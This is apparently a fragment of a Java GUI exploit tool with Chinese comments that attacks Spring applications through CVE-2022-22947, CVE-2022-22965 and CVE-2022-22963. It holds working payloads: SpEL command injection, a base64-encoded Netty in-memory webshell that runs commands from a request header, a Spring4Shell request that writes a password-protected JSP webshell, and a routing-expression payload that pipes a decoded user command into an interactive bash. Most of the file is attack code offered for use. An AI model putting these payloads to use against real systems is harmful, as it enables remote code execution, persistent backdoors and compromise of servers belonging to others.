            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
//  激活主机认证
            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            //  Button button = new Button("Click");
            //      fd = new TextArea();


            String url = urlTest.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            //     if (isValidUrl(url)) {

            if (!isValidUrl(url)) {
              responsetest.appendText("输入的不是有效的网址"+"\n");
             //    Alert alert = new Alert(Alert.AlertType.ERROR);alert.setTitle("拼写检查");alert.setHeaderText("");alert.setContentText("输入的不是有效的网址！");alert.showAndWait();
            } else {

            }
                URL url1 = new URL(url + "/actuator/gateway/routes/test113");

                String json = "{\n" +
                        "  \"id\": \"test\",\n" +
                        "  \"filters\": [{\n" +
                        "    \"name\": \"AddResponseHeader\",\n" +
                        "    \"args\": {\n" +
                        "      \"name\": \"Result\",\n" +
                        "      \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"whoami\\\"}).getInputStream()))}\"\n" +
                        "    }\n" +
                        "  }],\n" +
                        "  \"uri\": \"http://example.com\"\n" +
                        "}";
                String json1 = "{\n" +
                        "      \"id\": \"test\",\n" +
                        "      \"filters\": [{\n" +
                        "        \"name\": \"AddResponseHeader\",\n" +
                        "        \"args\": {\"name\": \"Result\",\"value\": \"#{T(org.springframework.cglib.core.ReflectUtils).defineClass('NettyMemshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQBFAoAPgB9CAB+BwB/CABTBwCACgAFAIEKAIIAgwcAhAoAggCFCgCGAIcKAIYAiAoACACJCgAFAIoIAIsKAIwAjQgASwoABQCOCgCPAIMKAI8AkAoABQCRCABOCACSBwCTCgAXAH0KAI8AlAgAlQcAlggAlwsAmACZCACaCACbCwCcAJ0HAJ4LACEAnwgAoAoAoQCiCgChAKMHAKQKAKUApgoApQCnCgCoAKkKACYAqggAqwoAJgCsCgAmAK0JAK4ArwoAFwCwCgAbALELALIAswcAtAkAtQC2CQC3ALgKALkAugoAMgC7CwC8AJ8JAL0AvggAvwoAoQDACwCyAMEJAMIAwwsAxADFBwDGBwDHAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA9MTmV0dHlNZW1zaGVsbDsBAAhkb0luamVjdAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAVX3ZhbCRkaXNwb3NhYmxlU2VydmVyAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAFHZhbCRkaXNwb3NhYmxlU2VydmVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHX2NvbmZpZwEABmNvbmZpZwEAEF9kb09uQ2hhbm5lbEluaXQBAAZ0aHJlYWQBAAFpAQABSQEACmdldFRocmVhZHMBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAB3RocmVhZHMBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAyAcAyQcAhAcAlgEADW9uQ2hhbm5lbEluaXQBAFcoTHJlYWN0b3IvbmV0dHkvQ29ubmVjdGlvbk9ic2VydmVyO0xpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7TGphdmEvbmV0L1NvY2tldEFkZHJlc3M7KVYBABJjb25uZWN0aW9uT2JzZXJ2ZXIBACJMcmVhY3Rvci9uZXR0eS9Db25uZWN0aW9uT2JzZXJ2ZXI7AQAHY2hhbm5lbAEAGkxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7AQANc29ja2V0QWRkcmVzcwEAGExqYXZhL25ldC9Tb2NrZXRBZGRyZXNzOwEACHBpcGVsaW5lAQAiTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAEE1ldGhvZFBhcmFtZXRlcnMBAAtjaGFubmVsUmVhZAEAPShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9PYmplY3Q7KVYBAANjbWQBAApleGVjUmVzdWx0AQALaHR0cFJlcXVlc3QBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXF1ZXN0OwEAA2N0eAEAKExpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxIYW5kbGVyQ29udGV4dDsHAJ4BAApFeGNlcHRpb25zAQAEc2VuZAEAbShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9TdHJpbmc7TGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7KVYBAAdjb250ZXh0AQAGc3RhdHVzAQAwTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7AQAIcmVzcG9uc2UBAC5MaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0Z1bGxIdHRwUmVzcG9uc2U7AQAKU291cmNlRmlsZQEAEk5ldHR5TWVtc2hlbGwuamF2YQwAQABBAQAMaW5qZWN0LXN0YXJ0AQAQamF2YS9sYW5nL1RocmVhZAEAD2phdmEvbGFuZy9DbGFzcwwAygDLBwDJDADMAM0BABBqYXZhL2xhbmcvT2JqZWN0DADOAM8HANAMANEA0gwA0wDUDADVANYMANcASAEADk5ldHR5V2ViU2VydmVyBwDIDADYANkMANoA2wcA3AwA0wDdDADeANYBAA9kb09uQ2hhbm5lbEluaXQBAA1OZXR0eU1lbXNoZWxsDADfAOABAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxpbmplY3QtZXJyb3IHAOEMAGcA4gEAH3JlYWN0b3IubGVmdC5odHRwVHJhZmZpY0hhbmRsZXIBABBtZW1zaGVsbF9oYW5kbGVyBwDjDADkAOUBACdpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFJlcXVlc3QMAOYA5wEABVgtQ01EBwDoDADYAOkMANMA6gEAEWphdmEvdXRpbC9TY2FubmVyBwDrDADsAO0MAO4A7wcA8AwA8QDyDABAAPMBAAJcQQwA9AD1DAD2AEgHAPcMAPgAeAwAdAB1DAD5AEEHAPoMAPsA/AEAM2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9EZWZhdWx0RnVsbEh0dHBSZXNwb25zZQcA/QwA/gD/BwEADAEBAQIHAQMMAQQBBQwAQAEGBwEHBwEIDAEJAQoBABl0ZXh0L3BsYWluOyBjaGFyc2V0PVVURi04DADfAQsMAQwBDQcBDgwBDwEQBwERDAESARMBACVpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxEdXBsZXhIYW5kbGVyAQAncmVhY3Rvci9uZXR0eS9DaGFubmVsUGlwZWxpbmVDb25maWd1cmVyAQAQamF2YS9sYW5nL1N0cmluZwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAXamF2YS9sYW5nL3JlZmxlY3QvQXJyYXkBAAlnZXRMZW5ndGgBABUoTGphdmEvbGFuZy9PYmplY3Q7KUkBAANnZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7SSlMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAdnZXROYW1lAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWdldFN1cGVyY2xhc3MBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBABhpby9uZXR0eS9jaGFubmVsL0NoYW5uZWwBACQoKUxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZTsBACBpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZQEACWFkZEJlZm9yZQEAaShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlcjspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAB2hlYWRlcnMBACsoKUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBIZWFkZXJzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEALmlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXMBAAJPSwEAD3ByaW50U3RhY2tUcmFjZQEAJmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEhhbmRsZXJDb250ZXh0AQAPZmlyZUNoYW5uZWxSZWFkAQA8KExqYXZhL2xhbmcvT2JqZWN0OylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uAQAISFRUUF8xXzEBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uOwEAGWlvL25ldHR5L3V0aWwvQ2hhcnNldFV0aWwBAAVVVEZfOAEAGkxqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7AQAYaW8vbmV0dHkvYnVmZmVyL1VucG9vbGVkAQAMY29waWVkQnVmZmVyAQBNKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7KUxpby9uZXR0eS9idWZmZXIvQnl0ZUJ1ZjsBAHUoTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwVmVyc2lvbjtMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXNwb25zZVN0YXR1cztMaW8vbmV0dHkvYnVmZmVyL0J5dGVCdWY7KVYBACxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvRnVsbEh0dHBSZXNwb25zZQEAK2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwSGVhZGVyTmFtZXMBAAxDT05URU5UX1RZUEUBABtMaW8vbmV0dHkvdXRpbC9Bc2NpaVN0cmluZzsBAFUoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9PYmplY3Q7KUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQANd3JpdGVBbmRGbHVzaAEANChMamF2YS9sYW5nL09iamVjdDspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZTsBACZpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxGdXR1cmVMaXN0ZW5lcgEABUNMT1NFAQAoTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZUxpc3RlbmVyOwEAHmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZQEAC2FkZExpc3RlbmVyAQBSKExpby9uZXR0eS91dGlsL2NvbmN1cnJlbnQvR2VuZXJpY0Z1dHVyZUxpc3RlbmVyOylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsRnV0dXJlOwAhABcAPgABAD8AAAAFAAEAQABBAAEAQgAAAC8AAQABAAAABSq3AAGxAAAAAgBDAAAABgABAAAAFgBEAAAADAABAAAABQBFAEYAAAAJAEcASAABAEIAAAHDAAQACgAAALUSAksSAxIEA70ABbYABkwrBLYABysBA70ACLYACU0DPh0suAAKogCHLB24AAs6BBkExgB1GQS2AAy2AA0SDrYAD5kAZRkEtgAMEhC2ABE6BRkFBLYAEhkFGQS2ABM6BhkGtgAMtgAUEhW2ABE6BxkHBLYAEhkHGQa2ABM6CBkItgAMtgAUtgAUEha2ABE6CRkJBLYAEhkJGQi7ABdZtwAYtgAZEhpLhAMBp/93pwAHTBIcSyqwAAEAAwCsAK8AGwADAEMAAABaABYAAAAYAAMAGgAPABsAFAAcAB4AHgAoAB8ALwAgAEQAIQBQACIAVgAjAF8AJABuACUAdAAmAH0AJwCPACgAlQApAKMAKgCmAB4ArAAvAK8ALQCwAC4AswAwAEQAAABwAAsAUABWAEkASgAFAF8ARwBLAEwABgBuADgATQBKAAcAfQApAE4ATAAIAI8AFwBPAEoACQAvAHcAUABMAAQAIACMAFEAUgADAA8AnQBTAFQAAQAeAI4AVQBMAAIAsAADAFYAVwABAAMAsgBYAFkAAABaAAAAHgAF/wAgAAQHAFsHAFwHAF0BAAD7AIX4AAVCBwBeAwABAF8AYAACAEIAAAB2AAUABQAAABwsuQAdAQA6BBkEEh4SH7sAF1m3ABi5ACAEAFexAAAAAgBDAAAADgADAAAANgAIADgAGwA5AEQAAAA0AAUAAAAcAEUARgAAAAAAHABhAGIAAQAAABwAYwBkAAIAAAAcAGUAZgADAAgAFABnAGgABABpAAAADQMAYQAAAGMAAABlAAAAAQBqAGsAAwBCAAABEAAEAAYAAABhLMEAIZkAVCzAACFOLbkAIgEAEiO2ACSZADctuQAiAQASI7YAJToEuwAmWbgAJxkEtgAotgAptwAqEiu2ACy2AC06BSorGQWyAC63AC+xpwAKOgQZBLYAMCssuQAxAgBXsQABAAwATQBRABsAAwBDAAAAMgAMAAAAPwAHAEAADABCABoAQwAnAEQAQwBGAE0ARwBOAEsAUQBJAFMASgBYAE0AYABOAEQAAABIAAcAJwAnAGwAWQAEAEMACwBtAFkABQBTAAUAVgBXAAQADABMAG4AbwADAAAAYQBFAEYAAAAAAGEAcABxAAEAAABhAFgATAACAFoAAAAPAAP8AE4HAHJCBwBe+gAGAHMAAAAEAAEAGwBpAAAACQIAcAAAAFgAAAACAHQAdQACAEIAAACUAAYABQAAADa7ADJZsgAzLSyyADS4ADW3ADY6BBkEuQA3AQCyADgSObYAOlcrGQS5ADsCALIAPLkAPQIAV7EAAAACAEMAAAASAAQAAABSABQAUwAkAFQANQBVAEQAAAA0AAUAAAA2AEUARgAAAAAANgBwAHEAAQAAADYAdgBZAAIAAAA2AHcAeAADABQAIgB5AHoABABpAAAADQMAcAAAAHYAAAB3AAAAAQB7AAAAAgB8'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}\"}\n" +
                        "        }],\n" +
                        "      \"uri\": \"http://example.com\",\n" +
                        "      \"order\": 0\n" +
                        "}";

                String json2="{\n" +
                        "\"predicates\":[{\"name\": \"Path\",\n" +
                        "\"args\":{\"_genkey_0\":\"/gmem/**\"}\n" +
                        "}\n" +
                        "],\n" +
                        "  \"id\": \"wolaile\",\n" +
                        "  \"filters\": [{\n" +
                        "    \"name\": \"AddResponseHeader\",\n" +
                        "    \"args\": {\n" +
                        "      \"name\": \"Result\",\n" +
                        "      \"value\": \"#{T(org.springframework.cglib.core.ReflectUtils).defineClass('com.example.GMemShell',T(org.springframework.util.Base64Utils).decodeFromString(''),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping,'/gmem')}\"\n" +
                        "    }\n" +
                        "  }],\n" +
                        "  \"uri\": \"http://test.com\"\n" +
                        "}";
                //     String json2= fd.toString();

                HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
                connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
                connection.setDoOutput(true);
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                byte[] input = json.getBytes(StandardCharsets.UTF_8);
                OutputStream os = connection.getOutputStream();


                //     connection.setRequestProperty("accept", "*/*");
                //   connection.setRequestProperty("connection", "Keep-Alive");\
                //         connection.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
                //      connection.setRequestProperty("Content-Type", "application/json");
                //      BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

                //   connection.setDoOutput(true);


                //       connection.disconnect();

                os.write(input, 0, input.length);
                os.flush();
                //  String response=br.readLine();
                int responseCode = connection.getResponseCode();

                if (responseCode == 201) {

                   responsetest.appendText("目标:"+url+"\n"+"【+】存在Spring Cloud Gateway RCE(CVE-2022-22947)漏洞" + "\n");

                    send5();
                    send2();

               //   send6();




          //          send3();  //
            //        button.setDisable(false);



                } else if (responseCode == 404 || responseCode == 401 || responseCode == 403||responseCode==200) {
                    responsetest.appendText("目标:"+url+"\n"+"不存在Spring Cloud Gateway RCE(CVE-2022-22947)漏洞" + "\n");

                }

         //   sendspe1();
         //  sendspel();


            } catch(Exception e){
                //     responsetest.appendText("不存在Sringboot Gateway网关命令漏洞"+"\n"+"检测完毕"+"\n");
            responsetest.appendText("网络异常" + "\n");

            }

   //     responsetest.appendText("检测完成" + "\n");
        }

    public void sendspe1() {


        try {


            //     Button button = new Button();

            //     responsetest.appendText("开始检测Spring Framework RCE (CVE-2022-22965)"+"\n");
            String url = urlTest.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            //   String json = "";

            URL url1 = new URL(url + "/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=");
            //  URL url1 = new URL(url+"/cttl/cmd?r="+urltest1.getText());
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            connection.setRequestProperty("suffix", "%>//");
            connection.setRequestProperty("c1", "Runtime");
            connection.setRequestProperty("c2", "<%");
            //  connection.setRequestProperty("Content-length","999654989");
            //  connection.setRequestProperty("Content-Length","2");
            //    byte[] input=json.getBytes(StandardCharsets.UTF_8);
            //   OutputStream os = connection.getOutputStream();
            //  os.write(input,0,input.length);
            ///   os.flush();

            int responseCode = connection.getResponseCode();
            //    System.out.println("Response Code : " + responseCode);

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            StringBuffer response = new StringBuffer();
            String inputLine = "";


            {
                if (inputLine.contains("Hello")){

                    responsetest.appendText("存在Spring Framework RCE (CVE-2022-22965)漏洞 \"+\"\\n");
            }


            }
                    //  if (responseCode == HttpURLConnection.HTTP_OK)
                    if ((inputLine = br.readLine()) == "ok") {



                        responsetest.appendText("存在Spring Framework RCE (CVE-2022-22965)漏洞 \"+\"\\n");
                        responsetest.appendText(url + "/tomcatwar.jsp?pwd=j&cmd=id");


            } else{

                responsetest.appendText("不存在Spring Framework RCE (CVE-2022-22965)漏洞" + "\n");
            }








            //  button.setDisable(false);
            //   responsetest.appendText("命令行开启！“\"+\"\\n");


        } catch (Exception e) {
            responsetest.appendText("网络异常" + "\n");

        }

    }


    public void sendspel() {


        try {


            Button button = new Button();

            //      responsetest.appendText("开始检测Spring Cloud Function SpEL RCE (CVE-2022-22963)"+"\n");
            System.setProperty("http.proxyHost", "127.0.0.1");
            System.setProperty("http.proxyPort", "8080");
            String url = urlTest.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + "/functionRouter");
            String json = "test";

            //     String json2= fd.toString();

            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "text/plain");
            connection.setRequestProperty("spring.cloud.function.routing-expression", "T(java.lang.Runtime).getRuntime().exec(\"whoami\")");
            // connection.setRequestProperty("Accept", "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            byte[] input = json.getBytes(StandardCharsets.UTF_8);
                OutputStream os = connection.getOutputStream();


            //     connection.setRequestProperty("accept", "*/*");
            //   connection.setRequestProperty("connection", "Keep-Alive");\
            //         connection.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            //    connection.setRequestProperty("Content-Type", "text/plain");
            //         BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            //   connection.setDoOutput(true);


            //  connection.disconnect();

              os.write(input, 0, input.length);
                   os.flush();

            int responseCode = connection.getResponseCode();
            //   responsetest.setText(response);
            //    if (responseCode == HttpURLConnection.HTTP_INTERNAL_ERROR) {
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            String inputLine;
            response.append(inputLine = br.readLine());
            while ((inputLine = br.readLine()) != null) {
            }
            response.append(inputLine);

            //    String regex = "\"path\":\\\"([^\"]*)\\\"";
            //      Pattern pattern = Pattern.compile(regex);
            //       Matcher matcher = pattern.matcher(response);
            //      if (matcher.find()) {
            //       String value = matcher.group(0); // 提取匹配的值（这里是name的值）
            //   //     responsetest.appendText(value+"\n");
            //       if(value=="functionRouter"){
            if (inputLine.contains("functionRouter")){
                responsetest.appendText("【+】可能存在Spring Cloud Function SpEL RCE (CVE-2022-22963)漏洞" + "\n");


        //     if ((inputLine = br.readLine()) == "6b737e4d788b48a147a1a7e198e546456") {



            } else if(responseCode==404||responseCode==401 || responseCode==403 ){

                responsetest.appendText("不存在Spring Cloud Function SpEL RCE (CVE-2022-22963)漏洞" + "\n");
            }


        } catch (Exception e) {


            responsetest.appendText("网络异常" + "\n");
        }

    }


    public void sendGetRequest() {


        //  System.out.println("1");
        String url = urlTest.getText();
        try {
         //   Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("127.0.0.1", 8080));
        //    System.setProperty("http.proxyHost", "127.0.0.1");
       //    System.setProperty("http.proxyPort", "8080");

            URL url1 = new URL(url+"/actuator");
          //  URL url1 = new URL(url+"/cttl/cmd?r="+urltest1.getText());
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            int responseCode = connection.getResponseCode();
          System.out.println("Response Code : " + responseCode);
               if (responseCode == HttpURLConnection.HTTP_OK) {
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

      StringBuffer response = new StringBuffer();
      //           String inputLine;
              //    response.append(inputLine = br.readLine());
  //  while ((inputLine = br.readLine()) != null) {}
   //               response.append(inputLine);
 //   br.close();
   //  StackPane root=new StackPane();
         //        root.getChildren().add(responsetest);

                   //   responsetest.setText(response.toString());







            //         responsetest.setText(url+"\n"+"检测到actuator特征"+"\n");
                   //  responsetest.appendText(url+"【+++】 可能存在Springboot Gateway漏洞利用！");
               //     responsetest.appendText("\n"+response.toString());





        }
                 else{

                //    responsetest.setText("\n"+"不存在Springboot gateway RCE漏洞"+"\n"+"检测完毕"+"\n");

                 }





        } catch (Exception e) {


             e.printStackTrace();
          // Alert alert = new Alert(Alert.AlertType.INFORMATION);alert.setTitle("Information Dialog");alert.setHeaderText("");alert.setContentText("网络错误");alert.showAndWait();
           // responsetest.setText(url+"\n"+"不存在Springboot gateway RCE漏洞"+"\n"+"检测完毕"+"\n");
        }

    }

    public void sendSp(){

        try{
             Button button=new Button();



            System.setProperty("http.proxyHost", "127.0.0.1");
            System.setProperty("http.proxyPort", "8098");
            String url =urlTest.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1); // 去除最后一个字符（斜杠）
            }
            URL url1 = new URL(url + "/functionRouter");
            String json = "test";

            //     String json2= fd.toString();

            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "text/plain");

            connection.setRequestProperty("spring.cloud.function.routing-expression", "T(java.lang.Runtime).getRuntime().exec(\"bash -c {echo,"+urltest1.getText()+"}|{base64,-d}|{bash,-i}\")");
            // connection.setRequestProperty("Accept", "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        //    connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool");
            byte[] input=json.getBytes(StandardCharsets.UTF_8);
          OutputStream os = connection.getOutputStream();


            //     connection.setRequestProperty("accept", "*/*");
            //   connection.setRequestProperty("connection", "Keep-Alive");\
            //         connection.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            //      connection.setRequestProperty("Content-Type", "application/json");
            //     BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));

            //   connection.setDoOutput(true);


            //       connection.disconnect();

           os.write(input,0,input.length);
  //          os.flush();
            //  String response=br.readLine();
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
           String inputLine;
       //     int responseCode = connection.getResponseCode();
          //    responsetest.setText(response);
         //   if (responseCode ==HttpURLConnection.HTTP_INTERNAL_ERROR) {
                if ((inputLine = br.readLine()) == "test") {
                    //  responsetest.appendText("【+】存在Spring Cloud Function Spel表达式注入漏洞"+"\n");
                    //      button.setDisable(false);

                    responsetest2.appendText("连接完成"+"\n");


                }
                else{

                    responsetest2.appendText("连接失败"+"\n");

                }



        }
        catch (Exception e){

        responsetest2.appendText("连接失败,网络异常！"+"\n"+"\n");

        }
    }








    @FXML
    void Clickevent1(ActionEvent event) {

        try {


            sendGetRequest1();



        //    sendSp();

        } catch (Exception e) {


            e.printStackTrace();

        }

    }




    @FXML
    void Clickevent(ActionEvent event) {




                responsetest.setWrapText(true);

                sendGetRequest1();


            //   responsetest.appendText("开始检测所有漏洞...."+"\n");
            //       TextArea textArea=new TextArea();
            //   textArea.setText("");

            //   sendGetRequest();

          //    sendspel();
        //   sendspe1();



            //     send5();
            //    sendGetRequest1();
            // send1();
            //     send2();
            //     send3();
            //  send4();
            // //  daili();















    }


    private class ResponseHeader {
    }
}

















    //    if (a.getText().trim().isEmpty()) {
            //   System.out.println("null");
      //      Alert alert = new Alert(Alert.AlertType.INFORMATION);
       //     alert.setHeaderText(null);
            //   alert.setContentText("ok");
   //         alert.showAndWait();
       //   b.setEditable(false);


        //    if (a.getText().trim().()) {
        //        System.out.println("nullok");










